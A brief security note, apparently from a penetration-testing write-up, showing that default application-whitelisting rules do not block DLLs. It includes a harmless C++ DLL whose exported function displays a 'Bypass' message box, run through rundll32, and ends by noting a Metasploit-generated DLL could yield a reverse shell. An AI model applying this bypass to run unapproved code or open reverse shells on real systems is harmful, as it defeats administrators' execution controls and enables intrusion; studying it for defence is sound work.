Default rules does not block dlls. Example:

```
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)

{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	
	return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}

```

Compile and save to `c:\tools\testdll.dll` and run `rundll32 c:\tools\testdll.dll`

We can generate dll using msf and get reverse shell.